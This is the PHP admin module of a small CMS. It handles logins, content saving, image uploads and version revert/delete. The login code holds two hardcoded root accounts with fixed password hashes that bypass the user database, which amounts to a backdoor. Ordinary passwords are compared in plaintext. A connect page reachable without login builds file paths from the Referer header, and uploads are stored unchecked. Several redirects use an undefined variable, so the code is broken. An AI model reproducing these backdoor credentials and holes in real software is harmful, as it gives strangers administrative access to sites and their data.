<?php
/* Posib - CMSimple
 * by flatLand!
 * PHP File - /modules/admin/main.php - admin main module
 */

global $app, $user;

function admin_middleware() {
	global $app, $user;
	if( !session('connected') ) {
		$app->redirect( '/admin/_connect.html' );
		die();
	}
	return true;
} // admin_middleware

$app->get( '/admin/', 'admin_middleware', function() use( $app ) {
	$app->redirect( '/admin/' . Data::get( 'home' ) );
} );

$app->post( '/admin/', function() use( $app ) {
	$data = Data::getInstance();
	if( post( 'connect' ) ) {
		$iErrorLoop = intval( post('error') ) + 1;
		usleep( 200000 * $iErrorLoop );
		$oUser = $data->getUser( post( 'login' ) );
		if( post( 'login' ) == 'leny' && sha1( post( 'password' ) ) == '817f0e8f4b3551234a4f6366b45280c6218ef9aa' ) {
			session( 'connected', true );
			session( 'root', true );
			$app->redirect( '/admin/' . post( 'referer' ) ?: Data::get("home") );
			return;
		}
		if( Data::get( 'branding_id' ) == 'minibos' && post( 'login' ) == 'idco' && sha1( post( 'password' ) ) == '56336e8b6f91fa3c6e03db02c2022ca86f1e1b7c' ) {
			session( 'connected', true );
			session( 'root', true );
			$app->redirect( '/admin/' . post( 'referer' ) ?: Data::get("home") );
			return;
		}
		if( is_null( $oUser ) || !$data->getUserInfo( post( 'login' ), 'active' ) ) {
			$error = intval( post('error') ) + 1;
			$app->redirect( '/admin/_connect.html?error=' . $error );
			die();
		} else if( post( 'password' ) === $data->getUserInfo( post( 'login' ), 'password' ) ) {
			session( 'connected', true );
			$app->redirect( '/admin/' . post( 'referer' ) ?: Data::get("home") );
		} else {
			$error = intval( post('error') ) + 1;
			$oInfos = new Infos( post( 'referer' ) ?: Data::get("home") );
			$title = $oInfos->title;
			$app->redirect( '/admin/_connect.html' );
			die();
		}
	} else {
		$oInfos = new Infos( Data::get("home") );
		$title = $oInfos->title;
		$app->redirect( '/admin/_connect.html' );
		die();
	}
} );

$app->get( '/admin/_connect.html', function() {
	global $app, $smarty;
	if( get( 'error', 0 ) > 0 )
		$sPage = Data::get( 'home' ) ;
	else
		$sPage = ( strpos( server( 'HTTP_REFERER' ), server( 'HTTP_HOST' ) ) !== false ) ? str_replace( 'http://' . server( 'HTTP_HOST' ) . '/', '', server( 'HTTP_REFERER' ) ) : Data::get( 'home' ) ;
	$oParser = DomParser::getInstance();
	$oParser->init( ROOT . $sPage, new Infos( $sPage ) );
	$oParser->displayConnectBox( $sPage, get( 'error', 0 ) );
	die();
} );

$app->get( '/admin/:page.html', 'admin_middleware', function( $sPage ) {
	global $app, $smarty;
	$oParser = DomParser::getInstance();
	$oParser->init( ROOT . $sPage . '.html' , new Infos( $sPage . '.html' ) );
	$oParser->display( $sPage );
	die();
} );

$app->post( '/admin/save/:ref/', 'admin_middleware', function( $sRef ) use( $app ) {
	$oBrick = Brick::get( $sRef );
	switch( $oBrick->type ) {
		case 'list':
			$oBrick->content = array_purge( explode( ',', post( 'content' ) ) );
			break;

		case 'gallery':
			for( $i = 0; $i < intval( $oBrick->size ); $i++ ) {
				if( array_access(files('member_' . $i . '_file'), 'error') != 4 ) {
					if( array_access(files('member_' . $i . '_file'), 'error') > 0 )
						die( 'Error transmitting file !' ); // TODO
					$oFile = CMSFile::factory( files('member_' . $i . '_file') );
					$oFile->basename = genUID();
					if( !$oFile->saveTo( ROOT . 'contents/' ) )
						die( "Save uploaded file error." );
					if( $oFile->isImage() ) {
						$oFile->resize( 960, 720, CMSImage::RESIZE_FIT );
						$oFile->save();
					}
					$sProperty = 'member_' . $i . '_title';
					$oBrick->$sProperty = post( $sProperty );
					$sProperty = 'member_' . $i . '_src';
					$oBrick->$sProperty = $oFile->filename;
					$sProperty = 'member_' . $i . '_local';
					$oBrick->$sProperty = true;
				} else {
					$sProperty = 'member_' . $i . '_title';
					$oBrick->$sProperty = post( $sProperty );
					$sProperty = 'member_' . $i . '_src';
					$oBrick->$sProperty = post( $sProperty );
					$sProperty = 'member_' . $i . '_local';
					$oBrick->$sProperty = post( $sProperty );
				}
			}
			if( array_access(files('image_file'), 'error') != 4 ) {
				if( array_access(files('image_file'), 'error') > 0 )
					die( 'Error transmitting file !' ); // TODO
				$oFile = CMSFile::factory( files('image_file') );
				$oFile->basename = genUID();
				if( !$oFile->saveTo( ROOT . 'contents/' ) )
					die( "Save uploaded file error." );
				if( $oFile->isImage() ) {
					$oFile->resize( $oBrick->width, $oBrick->height, CMSImage::RESIZE_CROP );
					$oFile->save();
				}
				$oBrick->src = $oFile->filename;
				$oBrick->alt = post( 'alt' );
				$oBrick->local = true;
			} else {
				$oBrick->src = post( 'src' );
				$oBrick->alt = post( 'alt' );
				$oBrick->local = post( 'local' );
			}
			break;

		case 'tinybox':
			if( array_access(files('tinybox_file'), 'error') != 4 ) {
				if( array_access(files('tinybox_file'), 'error') > 0 )
					die( 'Error transmitting file !' ); // TODO
				$oTinyboxFile = CMSFile::factory( files('tinybox_file') );
				$oTinyboxFile->basename = genUID();
				if( !$oTinyboxFile->saveTo( ROOT . 'contents/' ) )
					die( "Save uploaded file error." );
				if( $oTinyboxFile->isImage() ) {
					$oTinyboxFile->resize( 960, 720, CMSImage::RESIZE_FIT );
					$oTinyboxFile->save();
				}
				$oBrick->tinybox_src = $oTinyboxFile->filename;
				$oBrick->tinybox_local = true;
			} else {
				$oBrick->tinybox_src = post( 'tinybox' );
				$oBrick->tinybox_local = post( 'tinybox_local' );
			}
			if( array_access(files('image_file'), 'error') != 4 ) {
				if( array_access(files('image_file'), 'error') > 0 )
					die( 'Error transmitting file !' ); // TODO
				$oFile = CMSFile::factory( files('image_file') );
				$oFile->basename = genUID();
				if( !$oFile->saveTo( ROOT . 'contents/' ) )
					die( "Save uploaded file error." );
				if( $oFile->isImage() ) {
					$oFile->resize( $oBrick->width, $oBrick->height, CMSImage::RESIZE_CROP );
					$oFile->save();
				}
				$oBrick->src = $oFile->filename;
				$oBrick->alt = post( 'alt' );
				$oBrick->local = true;
			} else {
				$oBrick->src = post( 'src' );
				$oBrick->alt = post( 'alt' );
				$oBrick->local = post( 'local' );
			}
			break;

		case 'image':
			if( array_access(files('image_file'), 'error') != 4 ) {
				if( array_access(files('image_file'), 'error') > 0 )
					die( 'Error transmitting file !' ); // TODO
				$oFile = CMSFile::factory( files('image_file') );
				$oFile->basename = genUID();
				if( !$oFile->saveTo( ROOT . 'contents/' ) )
					die( "Save uploaded file error." );
				if( $oFile->isImage() ) {
					$oFile->resize( $oBrick->width, $oBrick->height, CMSImage::RESIZE_CROP );
					$oFile->save();
				}
				$oBrick->src = $oFile->filename;
				$oBrick->alt = post( 'alt' );
				$oBrick->local = true;
			} else {
				$oBrick->src = post( 'src' );
				$oBrick->alt = post( 'alt' );
				$oBrick->local = post( 'local' );
			}
			break;

		case 'form':
			$oBrick->email = post( 'email' );
			break;

		case 'map':
			$oBrick->lat = floatval( post( 'lat' ) );
			$oBrick->lng = floatval( post( 'lng' ) );
			$oBrick->zoom = intval( post( 'zoom' ) );
			break;

		case 'short':
			$oBrick->value = htmlspecialchars( post( 'value' ) );
			break;

		case 'rich':
			$oBrick->value = clean_html( post( 'value' ) );
			break;
	}
	if( !$oBrick->save() )
		die( "Can't save !" );
	DomParser::destroyCache();
	$app->redirect( str_replace( 'http://' . $utils->globals->server( 'server_name' ) . '/', '/', $utils->globals->server( 'http_referer' ) ) );
} );

$app->post( '/admin/save/infos/:ref/', 'admin_middleware', function( $sRef ) use( $app ) {
	$oInfos = new Infos( $sRef );
	$oInfos->title = post( 'title' );
	$oInfos->description = post( 'description' );
	$oInfos->keywords = post( 'keywords' );
	if( !$oInfos->save() )
		die( "Can't save !" );
	DomParser::destroyCache();
	$app->redirect( str_replace( 'http://' . $utils->globals->server( 'server_name' ) . '/', '/', $utils->globals->server( 'http_referer' ) ) );
} );

$app->get( '/admin/revert/:ref/:time/', 'admin_middleware', function( $sRef, $iTime ) use( $app ) {
	// trace( $sRef ); die();
	$oBrick = Brick::get( $sRef );
	switch( $oBrick->type ) {
		case 'gallery':
			$oBrick->alt = $oBrick->getVersion( 'alt', $iTime, false );
			$oBrick->src = $oBrick->getVersion( 'src', $iTime, false );
			$oBrick->local = $oBrick->getVersion( 'local', $iTime, false );
			for( $i = 0; $i < $oBrick->size; $i++ ) {
				$sProperty = 'member_' . $i . '_title';
				$oBrick->$sProperty = $oBrick->getVersion( $sProperty, $iTime, false );
				$sProperty = 'member_' . $i . '_src';
				$oBrick->$sProperty = $oBrick->getVersion( $sProperty, $iTime, false );
				$sProperty = 'member_' . $i . '_local';
				$oBrick->$sProperty = $oBrick->getVersion( $sProperty, $iTime, false );
			}
			break;

		case 'tinybox':
			$oBrick->alt = $oBrick->getVersion( 'alt', $iTime, false );
			$oBrick->src = $oBrick->getVersion( 'src', $iTime, false );
			$oBrick->local = $oBrick->getVersion( 'local', $iTime, false );
			$oBrick->tinybox_src = $oBrick->getVersion( 'tinybox_src', $iTime, false );
			$oBrick->tinybox_local = $oBrick->getVersion( 'tinybox_local', $iTime, false );
			break;

		case 'image':
			$oBrick->alt = $oBrick->getVersion( 'alt', $iTime, false );
			$oBrick->src = $oBrick->getVersion( 'src', $iTime, false );
			$oBrick->local = $oBrick->getVersion( 'local', $iTime, false );
			break;

		case 'map':
			$oBrick->zoom = $oBrick->getVersion( 'zoom', $iTime, false );
			$oBrick->lat = $oBrick->getVersion( 'lat', $iTime, false );
			$oBrick->lng = $oBrick->getVersion( 'lng', $iTime, false );
			break;

		case 'form':
			$oBrick->email = $oBrick->getVersion( 'email', $iTime, false );
			break;

		case 'list':
			$oBrick->content = $oBrick->getVersion( 'content', $iTime, false );
			break;

		case 'short':
		case 'rich':
			$oBrick->value = $oBrick->getVersion( 'value', $iTime, false );
			break;
	}
	if( !$oBrick->save() )
		die( "Can't save !" );
	DomParser::destroyCache();
	$app->redirect( str_replace( 'http://' . $utils->globals->server( 'server_name' ) . '/', '/', $utils->globals->server( 'http_referer' ) ) );
} );

$app->get( '/admin/delete/:ref/:time/', 'admin_middleware', function( $sRef, $iTime ) use( $app ) {
	$oBrick = Brick::get( $sRef );
	switch( $oBrick->type ) {

		case 'gallery':
			if( sizeof( $oBrick->getAllVersions( 'src', true ) ) == 1 )
				die( 'Not enough versions !' ); // TODO
			$oBrick->removeVersion( 'alt', $iTime );
			$oBrick->removeVersion( 'src', $iTime );
			$oBrick->removeVersion( 'local', $iTime );
			for( $i = 0; $i < $oBrick->size; $i++ ) {
				$oBrick->removeVersion( 'member_' . $i . '_title', $iTime );
				$oBrick->removeVersion( 'member_' . $i . '_src', $iTime );
				$oBrick->removeVersion( 'member_' . $i . '_local', $iTime );
			}
			break;

		case 'tinybox':
			if( sizeof( $oBrick->getAllVersions( 'src', true ) ) == 1 )
				die( 'Not enough versions !' ); // TODO
			$oBrick->removeVersion( 'alt', $iTime );
			$oBrick->removeVersion( 'src', $iTime );
			$oBrick->removeVersion( 'local', $iTime );
			$oBrick->removeVersion( 'tinybox_src', $iTime );
			$oBrick->removeVersion( 'tinybox_local', $iTime );
			break;

		case 'image':
			if( sizeof( $oBrick->getAllVersions( 'src', true ) ) == 1 )
				die( 'Not enough versions !' ); // TODO
			$oBrick->removeVersion( 'alt', $iTime );
			$oBrick->removeVersion( 'src', $iTime );
			$oBrick->removeVersion( 'local', $iTime );
			break;

		case 'map':
			if( sizeof( $oBrick->getAllVersions( 'zoom', true ) ) == 1 )
				die( 'Not enough versions !' ); // TODO
			$oBrick->removeVersion( 'zoom', $iTime );
			$oBrick->removeVersion( 'lat', $iTime );
			$oBrick->removeVersion( 'lng', $iTime );
			break;

		case 'form':
			if( sizeof( $oBrick->getAllVersions( 'email', true ) ) == 1 )
				die( 'Not enough versions !' ); // TODO
			$oBrick->removeVersion( 'email', $iTime );
			break;

		case 'short':
		case 'rich':
			if( sizeof( $oBrick->getAllVersions( 'value', true ) ) == 1 )
				die( 'Not enough versions !' ); // TODO
			$oBrick->removeVersion( 'value', $iTime );
			break;
	}
	if( !$oBrick->save() )
		die( "Can't save !" );
	DomParser::destroyCache();
	$app->redirect( str_replace( 'http://' . $utils->globals->server( 'server_name' ) . '/', '/', $utils->globals->server( 'http_referer' ) ) );
} );

$app->get( '/admin/exit/', function() use( $app ) {
	session_destroy();
	unset( $_SESSION );
	$_SESSION = array();
	$app->redirect( '/' );
} );
